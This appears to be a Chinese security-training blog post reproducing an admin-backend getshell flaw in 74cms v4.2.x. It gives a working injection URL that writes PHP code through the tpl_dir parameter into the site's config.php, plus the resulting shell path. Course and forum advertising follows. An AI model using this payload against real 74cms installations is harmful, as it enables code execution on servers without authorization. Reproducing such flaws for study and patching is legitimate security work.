#  74cms v4.2.1 v4.2.129 后台getshell漏洞   
闻人语默  老鑫安全   2024-12-16 08:04  
  
点击蓝字  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxSCYW8lTJ4T5ARwhvDzGwHubPrpM1XKjsJvycugae7fCXjWmiaC6XPUUA/640?wx_fmt=gif&from=appmsg "")  
  
关注我们  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxSnzqAUFibEeITqiaLvaQlJhibgfMws1w6THQT8yhHP2nSXgPcRZJ1YE4Cg/640?wx_fmt=gif&from=appmsg "")  
  
**漏洞描述**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxSn7LTcn4rfrptSyM7QvPF1wGxCTy1l0BZf8EoP4Bfic5rjva2M1duEQA/640?wx_fmt=png&from=appmsg "")  
  
  
厂商：74cms下载地址：  
```
http://www.74cms.com/download/index.html
```  
  
  
关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxS9h1wgWnicGwwqPuhXuerzoiaqGDmiaVabO6PWn8gu3qlSJtMEyHTkJVQA/640?wx_fmt=gif&from=appmsg "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxSbhDz1arOgSicU9IErETPU1evqj2niaTKtjibicjwZeSePVqx4jnwNPicBxA/640?wx_fmt=gif&from=appmsg "")  
  
  
  
74cms升级到最新版  
  
1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5， 搜索文件  
```
74cms\upload\Application\Admin\Controller\ApplyController.class.php6,查找所有$_SERVER['HTTP_HOST'] 改为http://baidu.com即可
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxS9h1wgWnicGwwqPuhXuerzoiaqGDmiaVabO6PWn8gu3qlSJtMEyHTkJVQA/640?wx_fmt=gif&from=appmsg "")  
  
**漏洞演示url**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxSbhDz1arOgSicU9IErETPU1evqj2niaTKtjibicjwZeSePVqx4jnwNPicBxA/640?wx_fmt=gif&from=appmsg "")  
  
  
```
http://74cms.test/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),'
```  
  
  
shell:  
```
http://74cms.test/Application/Home/Conf/config.php
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxS9h1wgWnicGwwqPuhXuerzoiaqGDmiaVabO6PWn8gu3qlSJtMEyHTkJVQA/640?wx_fmt=gif&from=appmsg "")  
  
**路径**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxSbhDz1arOgSicU9IErETPU1evqj2niaTKtjibicjwZeSePVqx4jnwNPicBxA/640?wx_fmt=gif&from=appmsg "")  
  
```
\74cms\upload\Application\Home\Conf\config.php
```  
  
哔哩哔哩账号：《老鑫安全培训》，《老鑫安全二进制》  
  
抖音账号：《老鑫安全培训》  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxSnzqAUFibEeITqiaLvaQlJhibgfMws1w6THQT8yhHP2nSXgPcRZJ1YE4Cg/640?wx_fmt=gif&from=appmsg "")  
  
论坛链接：  
  
https://www.laoxinsec.com/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxSn7LTcn4rfrptSyM7QvPF1wGxCTy1l0BZf8EoP4Bfic5rjva2M1duEQA/640?wx_fmt=png&from=appmsg "")  
  
  
**为什么要创建一个论坛：**  
  
大家可能不明白为什么我们需要创建一个论坛，并进行分享，在各大群里分享我们的链接，这里我来介绍一下，关注我们论坛的好处，第一，相信大家在年末的时候经常投简历，或许走内推或许在各大软件推送，但是岗位是有限的，并且因为群聊过多，无法集中性管理，我们后续会在论坛发布各类**招聘信息**  
，第二，我们的论坛加设了**交流区**  
可以在论坛进行讨论。第三，我们的论坛界面**清新脱俗**  
，大家可以创建自己的账号，发表关于自己的意见，我们会**采纳各位的建议**  
，后续进行改进，**一路走来，全都有你们。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxSyCrMXV0BEalEVTAv5VfakX191E2Phju8icjTEBftCicprDqjPZDyUlkg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxS7hYrSD99v1ucZD4axwCUbmibYiakiaXwXN7nD8xuE1ibyyciaIy6kPnicXlw/640?wx_fmt=jpeg&from=appmsg "")  
  
今天的分享就到此为止。  
  
如果大家有关于我们论坛整改的意见，大家可以加我们的管理员微信，让他拉你们进群。  
  
备注：  
**进群**  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxSP6G9kJ395sF12u1KrwSmDtezRuBq60DSmVk6Lg6lKJrgqmD6Y6hEXQ/640?wx_fmt=jpeg&from=appmsg "")  
  
****  
当然我们也做线上视频课程，我们的讲师有两位：  
  
**老鑫**  
：鑫哥做线上课程年数已经达到5+，在哔哩哔哩上都有往期公开的课程，前Wooyun核心白帽子，痴迷底层技术，在二进制方向有一定技术积累，后从事网安培训多年，截止目前已培训350+学员，培训学员遍布各大安全企业及机关单位。除二进制，web安全、安全开发、逆向等安全技术均有涉及。公众号：studentSec。    
  
**濠哥**  
：濠哥更是作为奇安信粤东安全运营中心技术专家，曾多次参与北上广深杭海南的金融业和电子政务机构的攻防演习与安全运营体系建设，曾被上海中型规模教育培训机构特聘为安全测试讲师。  
  
这是我们的**基础课程**  
，现在已经是第五期，这张表里介绍了我们的基础课程：![](https://mmbiz.qpic.cn/mmbiz_jpg/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxSgXPKnC2GM99CDXfLXHkrUZ8ibcVVVuX4lj9BfLJWs4xKY1x7kHJ4JaA/640?wx_fmt=jpeg&from=appmsg "")  
    
  
  
这是我们的进阶课程：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxSyiaPtBxQmOtKcDFjYKLTLI3qheWxkTdbb1JLkkz9CicPPTicIfiaTxGY8g/640?wx_fmt=jpeg&from=appmsg "")  
    ![](https://mmbiz.qpic.cn/mmbiz_jpg/bkcWdoIicx2ctsUTqV2maicsvGH6uMXAxStHQ1xKia24TFI2sHibaqIJqKlu3aOqYwFtvC7t42mPqO9yYBfJicHbhnA/640?wx_fmt=jpeg&from=appmsg "")  
    
  
